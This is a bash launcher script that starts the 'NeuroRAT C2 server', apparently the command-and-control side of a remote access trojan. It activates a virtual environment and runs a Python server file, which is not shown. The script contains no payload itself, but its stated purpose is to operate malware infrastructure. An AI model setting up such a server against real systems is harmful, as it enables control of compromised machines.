#!/bin/bash

# NeuroRAT Server Starter
# Author: Mr. Thomas Anderson (iamnobodynothing@gmail.com)
# License: MIT

# Default settings
HOST=${1:-"0.0.0.0"}
PORT=${2:-"8000"}
WEB_PORT=${3:-"5000"}
LOG_DIR="logs"
LOG_FILE="${LOG_DIR}/server_$(date +%Y%m%d_%H%M%S).log"

# Color settings
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

# Create log directory if it doesn't exist
mkdir -p "$LOG_DIR"

# Banner
echo -e "${BLUE}"
echo "███╗   ██╗███████╗██╗   ██╗██████╗  ██████╗ ██████╗  █████╗ ████████╗"
echo "████╗  ██║██╔════╝██║   ██║██╔══██╗██╔═══██╗██╔══██╗██╔══██╗╚══██╔══╝"
echo "██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║   ██║██████╔╝███████║   ██║   "
echo "██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║   ██║██╔══██╗██╔══██║   ██║   "
echo "██║ ╚████║███████╗╚██████╔╝██║  ██║╚██████╔╝██║  ██║██║  ██║   ██║   "
echo "╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝  ╚═╝╚═╝  ╚═╝   ╚═╝   "
echo -e "${NC}"
echo -e "${YELLOW}NeuroRAT C2 Server Starter${NC}"
echo -e "${YELLOW}Author: Mr. Thomas Anderson${NC}"
echo ""

# Check if virtual environment exists
if [ ! -d "venv" ]; then
    echo -e "${RED}Virtual environment not found. Please run deploy.sh first.${NC}"
    exit 1
fi

# Activate virtual environment
echo -e "${BLUE}Activating virtual environment...${NC}"
source venv/bin/activate

# Check if server files exist
if [ ! -f "agent_protocol/examples/neurorat_server.py" ]; then
    echo -e "${RED}Error: Server file 'agent_protocol/examples/neurorat_server.py' not found.${NC}"
    echo -e "${YELLOW}You may need to initialize the agent_protocol submodule.${NC}"
    deactivate
    exit 1
fi

# Start server
echo -e "${GREEN}Starting NeuroRAT C2 server...${NC}"
echo -e "${BLUE}Server configuration:${NC}"
echo "  Host:     $HOST"
echo "  Port:     $PORT"
echo "  Web Port: $WEB_PORT"
echo "  Log File: $LOG_FILE"
echo ""
echo -e "${YELLOW}Press Ctrl+C to stop the server${NC}"
echo ""

# Start server with logging
python agent_protocol/examples/neurorat_server.py \
    --host "$HOST" \
    --port "$PORT" \
    --web-port "$WEB_PORT" \
    2>&1 | tee "$LOG_FILE"

# Deactivate virtual environment when done
deactivate 